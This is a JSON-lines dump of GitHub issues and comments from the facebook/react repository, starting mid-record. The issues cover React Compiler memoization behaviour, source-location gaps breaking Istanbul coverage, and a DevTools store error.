([1](https://github.com/istanbuljs-archived-repos/istanbul-lib-instrument/blob/master/src/visitor.js#L424), [2](https://github.com/istanbuljs-archived-repos/istanbul-lib-instrument/blob/master/src/visitor.js#L420)) to get invoked, and they never do when the react compiler babel plugin runs first. I also noticed that the AST is missing stuff like source location info for nodes etc.\r\n\r\nOut of the box, `jest` appends istanbul to the rest of the babel plugins."}, {"author": "josephsavona", "body": "@swissspidy thanks for the extra context.\r\n\r\n> But for the hundreds of thousands of plugins out there that's nearly impossible. And having two separate implementations just causes fragmentation.\r\n\r\nI think this gets at the crux of the issue. Wordpress ended up with a translation approach that uses comments in a way that is incompatible with the JavaScript specification. The main two options are for Wordpress to do the work to migrate to an approach that is compatible with the JS standard (at which point lots of other tooling considerations probably get easier too), or React Compiler could attempt to support Wordpress' bespoke system. Given the complexity and challenges of supporting this, that i've described above, we are unable to take on implementing this and also unable to commit to supporting a community contribution.  \r\n\r\nWe understand this may be challenging, but we really would recommend evaluating what it would take to move to an approach that uses code rather than comments to encode critical information. We have some experience with designing translations (Meta developed [fbt](https://facebook.github.io/fbt/) for example) and would be happy to discuss and provide guidance."}, {"author": "josephsavona", "body": "> Is this why I'm running into some weird issues where sometimes istanbul is not instrumenting the code properly? I'm seeing statements, functions, etc just not even getting recognized full stop.\r\n\r\n@nathanmarks Likely yes. We go to considerable effort to preserve source locations throughout our compilation process to facilitate debugging etc. However, we know that there are some gaps. The playground actually has a tab to visualize the source maps, and we are definitely open to PRs to improve the precision of our source locations to make source maps more accurate."}, {"author": "nathanmarks", "body": "@josephsavona I was surprised by this minimal case because the compiler isn't even adding anything.\r\n\r\nWhat's the reason for the node visitors not even getting triggered in the istanbul code I linked above? is this because of information missing from the AST after the compiler runs? I didn't go much deeper but at a glance comparing outputs I did notice that the AST console.log output was missing some things that you normally see like the class names next to the objects etc."}, {"author": "josephsavona", "body": "@nathanmarks I don't know exactly how Istanbul works, but my guess is that it is using source location information. If we're missing some source span information, that could be throwing off Istanbul's evaluation of which code got executed or not."}, {"author": "nathanmarks", "body": "> @nathanmarks I don't know exactly how Istanbul works, but my guess is that it is using source location information. If we're missing some source span information, that could be throwing off Istanbul's evaluation of which code got executed or not.\r\n\r\nYou're bang on -- that's exactly the issue, they're ignoring node visits if location information is missing: https://github.com/istanbuljs-archived-repos/istanbul-lib-instrument/blob/master/src/visitor.js#L37\r\n\r\nAnd we're missing the `path.node.loc` off these.\r\n\r\nWhat's the correct approach here... running istanbul before, or fixing the source location issues and running after the compiler? Or not running compiler at all on specs (slightly reluctant on this one, as we've caught issues in specs due to unwanted memoization, and want to test the code as close to how it behaves in prod as possible)?\r\n"}, {"author": "josephsavona", "body": "The fix for Istanbul is to add missing source locations. We\u2019re open to PRs that either add them or add fixtures demonstrating code where locations are missing. \r\n\r\nWhat I would do for the latter is add a feature flag on Environment that enables a source locations validator. This would run after codegen and errors for any nodes that are missing a location. Then you could write fixtures which enable this flag and will fail (expected w an \u201cerror.\u201d prefix) bc locations are missing. "}, {"author": "nathanmarks", "body": "Thanks for the pointers! Let me have a look and see what I can do.\r\n\r\nIn parallel: correctness aside, as a temporary workaround on our app do you see any major issues with running istanbul first (otherwise we'll likely have to walk back our compiler rollout, as we're seeing devs get blocked on CI due to test suites suddenly reporting wonky coverage after unassuming changes). Everything seems to be fine on my side WRT the test suite behaving as expected."}, {"author": "github-actions[bot]", "body": "This issue has been automatically marked as stale. **If this issue is still affecting you, please leave any comment** (for example, \"bump\"), and we'll keep it open. We are sorry that we haven't been able to prioritize it yet. If you have any new additional information, please include it with your comment!"}, {"author": "swissspidy", "body": "> [<img alt=\"\" width=\"16\" height=\"16\" src=\"https://avatars.githubusercontent.com/u/841956?u=126b7e5e51c53b94606e538b5e208c75baad6cb7&amp;v=4&amp;size=80\">@swissspidy[<img alt=\"\" width=\"15\" height=\"15\" src=\"chrome-extension://dlebflppeeemcdpidccbiblndppbmjmh/ospo-chrome-ext-logo.png\">](https://teams.googleplex.com/pascalb@google.com)](https://github.com/swissspidy?rgh-link-date=2024-11-22T03%3A29%3A56.000Z) thanks for the extra context.\n> \n> > But for the hundreds of thousands of plugins out there that's nearly impossible. And having two separate implementations just causes fragmentation.\n> \n> I think this gets at the crux of the issue. Wordpress ended up with a translation approach that uses comments in a way that is incompatible with the JavaScript specification. The main two options are for Wordpress to do the work to migrate to an approach that is compatible with the JS standard (at which point lots of other tooling considerations probably get easier too), or React Compiler could attempt to support Wordpress' bespoke system. Given the complexity and challenges of supporting this, that i've described above, we are unable to take on implementing this and also unable to commit to supporting a community contribution.\n> \n> We understand this may be challenging, but we really would recommend evaluating what it would take to move to an approach that uses code rather than comments to encode critical information. We have some experience with designing translations (Meta developed [fbt](https://facebook.github.io/fbt/) for example) and would be happy to discuss and provide guidance.\n\nClosing because of this. I'll try to push the WordPress ecosystem down this road."}]}
{"repo": "facebook/react", "issue_number": 32424, "issue_url": "https://github.com/facebook/react/issues/32424", "issue_title": "[Compiler Bug]: Make memoization more granular", "issue_author": "oleksii-kononykhin", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAgHgBwjALgAgBMEAzAQygBsCSoA7OXASwjvwFkBPAQU0wAoAlPmAAdNvjiswBYPjAIy8ABb4AvvgC8+KAoDKilUPH5J02UTK4y6rToUARK2WN0TZujPwBbMnwSETtZ2hM74APyW1gB0vgJMuAjeWgB8+AlJwsj4ANoAuuLuUp40TNQIMAFBNtokZYkw1fxxmFXOADTyhnDKgoVuEpW4sGwAPABKCHTEjWGh1prAdeWVgc4aAPQp4mriIGpAA\n\n### Repro steps\n\nExample is provided in the [playground link](https://playground.react.dev/#N4Igzg9grgTgxgUxALhAgHgBwjALgAgBMEAzAQygBsCSoA7OXASwjvwFkBPAQU0wAoAlPmAAdNvjiswBYPjAIy8ABb4AvvgC8+KAoDKilUPH5J02UTK4y6rToUARK2WN0TZujPwBbMnwSETtZ2hM74APyW1gB0vgJMuAjeWgB8+AlJwsj4ANoAuuLuUp40TNQIMAFBNtokZYkw1fxxmFXOADTyhnDKgoVuEpW4sGwAPABKCHTEjWGh1prAdeWVgc4aAPQp4mriIGpAA)\n\nIn this example I would expect react compiler to memoize `mappedData` separately from the `filteredData` as I don't want to re-do the mapping each time when search string changes. \nWhat I would expect is for `filteredData` to have it's own memoization block with the `search` and `mappedData` as dependencies.\n\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19\n\n### What version of React Compiler are you using?\n\nlatest", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: React Compiler"], "comments": [{"author": "oleksii-kononykhin", "body": "As a workaround I can try to make some of the functions \"hooks\" with explicit `'use memo'` directives, but I don't think this is the best way to go\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAgHgBwjALgAgBMEAzAQygBsCSoA7OXASwjvwFkBPAQU0wAoAlPmAAdNvjiswBYPjAIy8ABb4AvvgC8+KAoDKilUPH5J02UTK4y6rToUARK2WN0TZujPwBbMnwSETtZ2hM74APyW1gB0vgJMuAjeWgB8+AlJwsj4ANoAuuLuUp40TNQIMAFBNtq6CABiZYmVgc78cZhVzgA08oZwyoKFbhKVuLBsADwASgh0xDDVUWSawCRNFV3WGgD0KeJqw+K0DMys9g0bLdXtfp2t1r0KSgPCYhIA5HU+SRAf7mMJvh1uVFm0OlsyE9+oMDiA1EA"}, {"author": "NeutronDisk", "body": "\n\nIt is using react-stick controller to render react-compass view in tic tac toe board model  \n```\ndigital_board: [1, 2, 3, 4, 5, 6, 7, 8, 9];\nbyte_board: [x/o, x/o, x/o, x/o, x/o, x/o, x/o, x/o, x/o];\nrun_stick: 4*byte_board - digital_board;\nroute('/');\n```\n![Image](https://github.com/user-attachments/assets/073db9be-7f2c-4117-bedf-770dcb71cf1f)"}, {"author": "ogbukosichukwu63", "body": "> ### What kind of issue is this?\n> * [x]  React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)[ ]  babel-plugin-react-compiler (build issue installing or using the Babel plugin)[ ]  eslint-plugin-react-compiler (build issue installing or using the eslint plugin)[ ]  react-compiler-healthcheck (build issue installing or using the healthcheck script)\n> \n> ### Link to repro\n> https://playground.react.dev/#N4Igzg9grgTgxgUxALhAgHgBwjALgAgBMEAzAQygBsCSoA7OXASwjvwFkBPAQU0wAoAlPmAAdNvjiswBYPjAIy8ABb4AvvgC8+KAoDKilUPH5J02UTK4y6rToUARK2WN0TZujPwBbMnwSETtZ2hM74APyW1gB0vgJMuAjeWgB8+AlJwsj4ANoAuuLuUp40TNQIMAFBNtokZYkw1fxxmFXOADTyhnDKgoVuEpW4sGwAPABKCHTEjWGh1prAdeWVgc4aAPQp4mriIGpAA\n> \n> ### Repro steps\n> Example is provided in the [playground link](https://playground.react.dev/#N4Igzg9grgTgxgUxALhAgHgBwjALgAgBMEAzAQygBsCSoA7OXASwjvwFkBPAQU0wAoAlPmAAdNvjiswBYPjAIy8ABb4AvvgC8+KAoDKilUPH5J02UTK4y6rToUARK2WN0TZujPwBbMnwSETtZ2hM74APyW1gB0vgJMuAjeWgB8+AlJwsj4ANoAuuLuUp40TNQIMAFBNtokZYkw1fxxmFXOADTyhnDKgoVuEpW4sGwAPABKCHTEjWGh1prAdeWVgc4aAPQp4mriIGpAA)\n> \n> In this example I would expect react compiler to memoize `mappedData` separately from the `filteredData` as I don't want to re-do the mapping each time when search string changes. What I would expect is for `filteredData` to have it's own memoization block with the `search` and `mappedData` as dependencies.\n> \n> ### How often does this bug happen?\n> Every time\n> \n> ### What version of React are you using?\n> 19\n> \n> ### What version of React Compiler are you using?\n> latest\n\nogbukosiw88p3v5"}, {"author": "mofeiZ", "body": "Thanks for the report! This isn't a bug as much as React Compiler not having access to function parameter types + effects. Right now, there's no way for us to understand that `filterData` does not write to its arguments. Replacing your filterData call with something that writes to its arguments, we see that it's invalid to memoize `mappedData` and `filteredData` separately.\n\n```js\nfunction appendIds(data, makeId) {\n  for (const entry of data) {\n    entry.id += makeId(entry);\n  }\n  return data;\n}\nexport default function MyApp() {\n  const { makeId } = useMakeId()\n  const { data } = useData()\n\n  const mappedData = data ? data.map(item => item) : []\n  const resultData = appendIds(mappedData, makeId)\n\n  return <RenderData data={resultData} />\n}\n```\nIf React Compiler produced the memoization you requested, the compiled output might look something like this.\n```\nexport default function MyApp() {\n  const { makeId } = useMakeId()\n  const { data } = useData()\n\n  let mappedData;\n  if (/* data changed */\n    mappedData = data ? data.map(item => item) : []\n  } else { /* reuse */ }\n  \n  let resultData;\n  if (/* mappedData or makeId changed */) {\n    resultData = appendIds(mappedData, makeId)\n  } else { /* reuse */ }\n  ...\n}\n```\nNow let's walk through what happens when we re-render with a changed `makeId` but the same `data`.\n1. We enter the else block of the first memo block, reusing the previous calculated `mappedData`. This already has IDs appended (from the previous render)\n2. We enter the if block of the second memo block, appending IDs (*again*) to mappedData. This is invalid.\n\n---\nDifferentiating between functions that change their arguments and ones that only read is difficult because neither typescript nor flow has deep read-only / mutable types. If you're a library author or working with widely reused functions, feel free to play around with the experimental / unstable `moduleTypeProvider` option, which should let you specify function effects"}, {"author": "oleksii-kononykhin", "body": "@mofeiZ Thank you for taking you time to answer! Your explanation makes perfect sense and thanks for a hint at `moduleTypeProvider`. Also if possible, would be nice to make such compiler behaviors more obvious."}, {"author": "NeutronDisk", "body": "Depth = 104*7 = 91*8 = 9*9*9-1 = x728"}]}
{"repo": "facebook/react", "issue_number": 32432, "issue_url": "https://github.com/facebook/react/issues/32432", "issue_title": "[Compiler Bug]: React throws an error when useMemo is used.", "issue_author": "Uttkarsh-Srivastava", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhASwLYAcIwC4AEASggIZx4A0BwBUYCAsghhAQL4EBmMEGBAHRAwyFIQIB2mHPhp0GAETRgspPHAAWHbr35CR5PAFoRAEygAPcVOy5CcMGB19BIAHQB6AHKkAbmgBzNTQICQUYUgB3BBg3MAcwa2k7AgBlBFUIvFxnPRAAATg+HAkECTwwDwQLLBjMMoqPXzA1D3TMtVw2jNIs3CTbWQBhUNM0PBCJUgAbABk0CQBrXNd8yIisWphKkYkxidCZ+aWPXf3Jo4XFgZlCAEkMUgCEWYhSUxiVoULi0IbK3wARg8DyeLzeHxgIMez1e7xiNxSAAVeFgACoAT1qTh4LiEWFRRjwWIQiRAkmSslozzwAEFHAg8Ei1FpOLi8j8MKwJABVCbTMkUwaENFPL4FIq2UrlAEAJg8ooCCqeiKpBA0pD20wQtKgeA0DTQcGCoWopCwaFeAWghDZulWRXKpAWMUqtM2HkMk0FNluBAA4rSAKK+BrizyBkMNaySR1gQhDAx4F5XAgAXgIAApgNMrv7eFAsNRQkNc3BFtRjSIkdNNQAJMiQ9gASnTAD4aJICN2CCI8LAJARc0t89AsG5HlhM5nhxWCAsPhZW2mO8Auz2N32B1n1xu9wQADxncYXOZXXf7y+LBAYtPABfVdgXy977J32duWDTJ+Dl+XuC1o4PgYAgd4AAZcNqFgEI8MABAsaIQFgRiAgAbAQqimGMEgBAAQhA+pGAAHAQMyBBIQwNJ8ABW9ATFwGK4Yy0RlAQAR6smMBGKE0wYgQEgQLSEiaLgIzTLgYE-n+l7KEGFicVM0zvlcbjKAA+tUCkzFJ0l7iWZaLHembLh2+lGosM5XM2OnSW2z66QeYy+AQAGkEBpAgeBkHVKRuYBBRVEwJJdm-rpl4HqCsIQp8YDwMpSyqTCCBqV+nCRGgpj6mmQiAkRWBWCA6oIIEGh4NlIC5flQgEB4IVhS+jloM5rnuZ5wBgQARhApgYiQ7G1jABAACTAAkE69PBEizAgXB4OwwU5ipYwqLWGJqcm8nsAeHhOXV9Xdttu32dJi0JeppSRAQABkV2HoqQ6kB1CBKUIXgIJE1VFOJMB3kIADEADMuFA0DQicB15CLAEBZ7GJuC-SAf0AGJBkMSMAOxI2DNVtjZ9WnYsqlgGpIgXddt0APIddRCAUG414YmAmZVggNb1o2MTNm42o4fqBAdgADOTLm9KztYSA28KxKT73C5mx31Qe921k9L0gCQZNeBAH2FV98NrojIPA7h2MQ+W0PQLDEDfQjyOoxjWMgJwtUKy+1muz223HgcinHIse37s2F4tpIP6xqE8YELhUBoNMpjzJHGbZrOYC0jAEQYsWFEGZWotsxLHMwC27adqFLkR4QubxhTXB+04Gb0EwLAQNOJmly+W4wIOKdpxn41TpZI4FkW857NUbdrmXL5oFwWazqOhYANoCwAum4y1YKt62aQQACEGZCFaNpCK2k-7d2neDvLU-n41zkM3eD4WJwLVgMBoHtd5FhiVAGASMFHt9oHnaL0Tog0wBoAAF4fyEBYMknBYKTUQlgO8aFnYB3PvuO+LlAJvw8h-Majo8DOlKEXNsR4kwpiWEOPMw94qLAXlgTgZlyx3hYYsF+edxaS0hHeFm+ceExHYLVQ6TUMGYNEb4cRukg4333HjDcIcy7sGoIvHu6dSCZwIOwyg-DuGFxXrIzcjJtxVzwDXOuodJDhwkJHAkEAuCxwQHcR06ZXClTwFgMAyAPAeD+BgAIbh2IYG1HgVSEAPBQGohoOAAtSC0VMJEDQUAEAdUiHgAArJA2KcRfABGsHGSuEBrR6hcaENxQgPFeJ8X40oASgm-1CeEjwMS4IaCInwGAHUuBqEcKYOJWAACcuT8nkgkJILgUBhI+wID4fwQQfbhCiDETM9ivGnwvL48utjK5XFThoviGYOoxzjgnPAqzURgG5nshQahSDUDWVcnRGFLluD0ezKWRieyFIIBvNQmg3GNyUCof5GhjLWLLpfHccjDzSKwU5HBbk8FtQglBH+f8CDpVMDSIwRCSExAATCl8wBHnc2Kc8UwdxBwAH5oWYI3EeUYJ5DhniWIA+qb52oeAwBiIw5AihTLwJJdlYVX7vy8lBYao1HBvNCMQl0RcYITQQkhYivlyKUXKDROiM9GLMQQKxdieBOLcQkLxfiglhIaFEtbCSCj6XdnYUZCeIrz6RlDOUNwoQUQOKcaWcymZ0p7G1mS40Ps3CqH1FMECXyHUvlJew8FRLz7sHtftOF9LsFivwRKnyZF-Kas4mxDiMRTW8UJXGv8EUkpwkhAQWKcA7z2McdqMpEhOAGhKmVIQAAWPKBVMUZSyr2-t1UXbJodVm3B4rP5outr-QcI0xqIIWNNWa812AZsrQyhF2aUXTB7ekDAaB8JxwWo86ln4GAwFucQy9jcu74K2jtMRrrJ27unTm9qYBHjTGmH1KAA0CAbTwOkR0phegYmCgANTQLLZtTjJFbrjUht9VaX1SLQw1SK4IpZYd0p2gIpVyqyh7VVMZ27LxYuHSAUj5H8PSQbXeGk9IGBMhZPLcAeTKhGgjh4TQCBfC8AkCYLtak6MWDUgSTAkGRknzTfS8dlavZMp9pcJYyHA4EGQHSlDTkGN7j3R-VFPkl0yrxQqhByqJDILVfmgKWrBq0XjLqpieAWKDiNSanifEBJCREjAOGQUFOYKdcAYyJcz6Ub3O6hoXqJA+pbQgf15ZOMAXMifAzL4-nqDBRqLUOo9QGnKEaE0EhjKxui92BN2cA2VcramgzmnFYfqRTOkz0F1UFsCsW41pafMVqq57HDtaYpxRJbwJLbaO3FSI92kAfbyODsyhocqi2B1KaGwdVrrVjNf3RYu6VVyV1TRmnNQbW2d1NURbt8CB6j0nutqYYKdY0DUH1DEBAu9UMTu3VOtrX6wI-pmP+hA-VejAc0mB0YkHgpWgWDVNI5ECA8iwD9y7h4MPNbCuj6L1awSjZgFly8hHiNCAk9YDH1HVvk7IwVYn+4mPABYwydj+pONgG4x4Xjtj+MGiE6EUTc3xN06kzAGTMAMRyZAO7X7YVNuTqx2h2XEjo6x3jsoXZSwwC3tIE215KddfMNq6wibSEnkm44SLas+ipb6-N28rhHymwK-xqS8SAQKVUoILS6+ymdvItAkIfb86-5CGxw5b2p4-YM8M5+lFX8lVwRVchNCGF3jYTwgRDQdm-IOaLc5+ier3MGs8yWriPmLX+etYF21g0zNXIs6QjdseNxhYiyuX5yhI2aEzOaS0xSbQVZC+fCPQCA-tcT-ZwtBLN2t-CiN6K4Dxse5tNN5bNHKoDtJ-NrfY6x+Zon4DrqPUANAYb+NZPp310LTAkfPUklcdbaf3904qno9XAPwypXcueyth0xIIBt+Oyi-sSqSu8LrnLGhgeF-p7CAn0OAlAjAiAHAtjK7hIkfgnnOtMAulKoQnKvioqhfu8LsPKs3hdn9pgXtpKsQXnkGHsFZlfrZmhBQVVv9rdu1F9ChNwDQUdm4F-KkBoOLksALBurAUAovnhr-pRkZnwjKhANTLTHgEjOMKQSQiPlttTmtqOhRhjiTrNmTgtjofPoxuNuAaYLrm4OaFgGpKYNrGahCG4AaFLGpDJs8BoduugXjj-hjuwYHuBFwRkgQCfhiA9qeqYHgTKidmuudnPtIfSmbl4pehAXcskZsLYfYeJO8Jes4U2CYZjkdPEQ1D4XjlQQjCHjgRil5v1manxCdrZj2mDOIX+IkWAMkRYakVYekXYZEA4dkfwWQP2CIG0f3NOFwIMbAAgNQE-C6kUefFCn7nofCtdg-PeGPM-Ddv4QbInvUaqo0U7M0cppIZCPkZgkzizmxsyOzkIJzgEDxnGB4BMOWEYNDKXtLirksfVFoTlMYXMVtjvuVHvroZ8ZeF4SCdttdrIQbNURXrUfWr+qDuDkTgccAOMWoJMc+oUeCZ7CUUsfVtFi2B4TjriZQZCfHsgYnjCWWnUdZvhIRGhE0fkYynsMyr7OeH8fVFCUIH5lajat9GDKcT2JyuYZYdYRkb0VkaYF0ZvMlPGLgAgNcksESXGu3m3LFp6qEHcBTKkO6FgAoJkRCClhZB8UsbJPJDEIpPkYcQ5McQiByWcWYa8ikcQtKeKX0VKdYdqGpHKSIIlGCClDAMAfaefN8SAIMqhPRsGftACUIADLKJGSCWCa-lHiyn7NaVgimWyWylGX+FySADyQFkFgKTmS+MKU6R0Xeq6T0e6ZetaMUl6T6QgJerOMqQ6qqSXOqWEqEEJKYLwBlLqfqRKYaQZMZK2fSmaVpNMFaYKQdLaUTiWbpFCWBBftEWdi3guaYY2q0VYRWaQFWQae8EEhAPWbKdkL6W4clKlDOXuKGeGQmdiUVF2uVHGfeUsUmcpm-iyWpqyv7LHqAbfCScSc1iaXuNtBgrImHBIHMoEGVkstELEGspiNiG4lFt2Ibncjpj6uiCSFcr0H3MoCQAAI4xxmCUAXjOmkCYWohIWkheqKEUBkVlzsJUVIQ0VXKTLCRExEUkUICmCMUbge5e4SAsXYXYhuBdTWyMWQXQULKTBwUxDrwzSkCAZMiXIoUXjoXEI6aLwrxSUQrVB+gfA9IqWzJ+AwWLIRDwWSBOxAA\n\n### Repro steps\n\nWhen I use the component (added in the playground) on my page with react compiler enabled, React gives the following error \n\n<img width=\"776\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/f5fb66b0-a976-46ab-8a1b-ea4000039d95\" />\n\nThis error gets fixed if I remove the useMemo used on line 37. I was wondering why is that happening?\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n18.2.0\n\n### What version of React Compiler are you using?\n\n19.0.0-beta-21e868a-20250216", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: React Compiler"], "comments": []}
{"repo": "facebook/react", "issue_number": 32269, "issue_url": "https://github.com/facebook/react/issues/32269", "issue_title": "[Compiler Bug]: Upgrading from `e552027-20250112` to `27714ef-20250124` no longer optimizes", "issue_author": "SimenB", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhHCA7MAXABAYQgFsAHZXAJQQEM5sA6AMX1wF5cAKASjYD5dgAHQy5c6LHgDaYBABsEdBABMAqjJhgANLhnYAynIXZlahBoC6bXFBl7s1YwB4YNJZlkBPXKZgB5GACCJACWPpLmvBzhXADcwsKi4jjW6gCSSmBWMvKKqupg9ETUJBwcNmY8rPzlMPTBSrHxImKYyXjs3HwCuAmiLRK41DAwVuFxGL2iAGYQIxxJeNlGJuq4EFMpZulgPELNfYPD9CQ2ABYcS7k+jfu4AL6TuC7YsBPND2+iz6+4GFCysnGd3GIDuQA\n\n### Repro steps\n\nNo reproduction steps required - the playground shows the error.\n\nhttps://github.com/facebook/react/pull/32093/files#diff-20b95f808e27819de316464ff5819940614b11b694deb9f1c4fecf39dff6b6e4R1607\n\nAs a workaround I've just extracted the function (in our real app it's a `queryFn` to `react-query`) outside of the component and pass it the arguments instead, so we no longer loop inside the component itself.\n\n---\n\nFor future reference (for when this is fixed and the playground no longer shows an error), this is the current result:\n\n<img width=\"670\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/c9d632bb-f4b0-4ee4-8026-eb086cdbc3ea\" />\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\nN/A\n\n### What version of React Compiler are you using?\n\n`27714ef-20250124`", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: React Compiler"], "comments": []}
{"repo": "facebook/react", "issue_number": 32364, "issue_url": "https://github.com/facebook/react/issues/32364", "issue_title": "[Compiler Bug]: math operators prevent caching", "issue_author": "lstkz", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAMygOzgFwJYSYAEAYjHgpgCYAyeYOAFMEWuZVWEQL4CURwADrEiAGwQ4iADyIBeIgikAHSmDwA3BIzYVqYXgG5hRaQGpTRkTAmxijYyaIAeKhoB8DxwKndPzgPSu6h4ihsLcINxAA\n\n### Repro steps\n\n```ts\n  let x = expensive(friends);\n  x++;\n```\nIt's not memoized, and `expensive` is called on every render.\n\n\n---\n\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAMygOzgFwJYSYAEAYjHgpgCYAyeYOAFMEWuZVWADREQ4AWCGEQC+ASiLAAOsSIAbBDiIAPIgF4iCZQAdKYPADcEjNhWpgxAbhlEieNEUZ9BMCdNm3lAai-XZImyIYRVhiRkDbAB4qQwA+CNtJZQCPIkiAehiDeNkrGREQESA\n \n\n```ts\n  let x = expensive(friends);\n  if (other) {\n    x++;\n  }\n```\nSimilar. Not cached.\n\n---\n\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAMygOzgFwJYSYAEAYjHgpgCYAyeYOAFMEWuZVWADREQ4AWCGEQC+ASiLAAOsSIAbBDiIAPIgF4iCZQAdKYPADcEjNhWpgxAbhlEieNEUZ9BMCdNm3VGgIw3RfmEVYYkY-WwAeKkMAPjDbSWUROPCAeiiDWNkrGREQESA\n```ts\n  let x = expensive(friends);\n  if (other) {\n    x = 1\n  }\n```\nCached properly.\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\nlatest from playground\n\n### What version of React Compiler are you using?\n\nlatest from playground", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: React Compiler"], "comments": [{"author": "guillaumebrunerie", "body": "I think this is a duplicate of #29172. The compiler does not cache expensive function calls. It only caches values that risk triggering a useless rerender, and by doing `x++` you\u2019re telling the compiler that `x` is a number which cannot trigger useless rerenders."}, {"author": "josephsavona", "body": "@guillaumebrunerie yup this is a duplicate, thanks for flagging! Great explanation. "}]}
{"repo": "facebook/react", "issue_number": 21445, "issue_url": "https://github.com/facebook/react/issues/21445", "issue_title": "Error: \"Cannot add child \"18903\" to parent \"18774\" because parent node was not found in the Store.\"", "issue_author": "atulSagotra", "issue_body": "<!-- Please answer both questions below before submitting this issue. -->\r\n\r\n### Which website or app were you using when the bug happened?\r\n\r\nPlease provide a link to the URL of the website (if it is public), a CodeSandbox (https://codesandbox.io/s/new) example that reproduces the bug, or a project on GitHub that we can checkout and run locally.\r\n\r\n### What were you doing on the website or app when the bug happened?\r\n\r\nIf possible, please describe how to reproduce this bug on the website or app mentioned above:\r\n1. <!-- FILL THIS IN -->\r\n2. <!-- FILL THIS IN -->\r\n3. <!-- FILL THIS IN -->\r\n\r\n<!--------------------------------------------------->\r\n<!-- Please do not remove the text below this line -->\r\n<!--------------------------------------------------->\r\n\r\n### Generated information\r\n\r\nDevTools version: 4.13.1-93782cfed2\r\n\r\nCall stack:\r\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:21447:43\r\n    at bridge_Bridge.emit (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:19607:22)\r\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:19767:12\r\n    at listener (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:37788:39)\r\n\r\nComponent stack:\r\n(none)\r\n\r\nGitHub URL search query:\r\nhttps://api.github.com/search/issues?q=Cannot%20add%20child%20%20to%20parent%20%20because%20parent%20node%20was%20not%20found%20in%20the%20Store.%20in%3Atitle%20is%3Aissue%20is%3Aopen%20is%3Apublic%20label%3A%22Component%3A%20Developer%20Tools%22%20repo%3Afacebook%2Freact", "issue_labels": ["Type: Bug", "Component: Developer Tools"], "comments": [{"author": "bvaughn", "body": "Hi @atulSuperman!\r\n\r\nI'm sorry you ran into this problem \ud83d\ude26 \r\n\r\nUnfortunately, it doesn't look like this issue has enough info for one of us to reproduce it though. This means that **it's going to be very hard for us to fix**.\r\n\r\nPlease help us by providing a link to a CodeSandbox (https://codesandbox.io/s/new), a repository on GitHub, or a minimal code example that reproduces the problem. (Screenshots or videos can also be helpful if they help provide context on how to repro the bug.)\r\n\r\nHere are some tips for providing a minimal example: https://stackoverflow.com/help/mcve"}, {"author": "jwandekoken", "body": "I am also having this bug"}, {"author": "bvaughn", "body": "@jwandekoken See the comment above please :) Repro is needed."}, {"author": "TobyMellor", "body": "This happened to me, the node wasn't appearing in the Components tree and I was getting this error. The problem was that my `key` attribute was way too long"}, {"author": "mamedium", "body": "![image](https://user-images.githubusercontent.com/42837306/119130493-840df280-ba62-11eb-9cb1-8319f1d645a8.png)\r\n\r\nsuddenly having this issue right now. I thought it was because of my commits, but changing to another old branch just give the same errors.\r\n\r\nit was working just fine yesterday, don't know why. maybe due to the devtools update or something?\r\n\r\nbtw I'm on react 16.8.6, react devtools 4.13.3 (5/19/2021)"}, {"author": "bvaughn", "body": "@muhfs94 Try updating to the latest release (4.13.4) just to rule anything out. But if you're still seeing the issue, then we still need a repro case."}, {"author": "mamedium", "body": "> @muhfs94 Try updating to the latest release (4.13.4) just to rule anything out. But if you're still seeing the issue, then we still need a repro case.\r\n\r\nat first the bug still persists. with same error log. then I retried close the devtools and opened it again (I think I actually have done this as well before) then somehow it works now. \r\n\r\nthe error log still shows up but at least now all components are showing on the devtools, and that's all I need.\r\n\r\nin addition, I found this\r\n![image](https://user-images.githubusercontent.com/42837306/119177584-b6394780-ba96-11eb-82fc-5341c2a3f631.png)\r\n\r\nand I was trying to hide that component (which has no recent changes on it) to see whether it has any impact. or any component that last showing on the devtools. but for now, that'll be 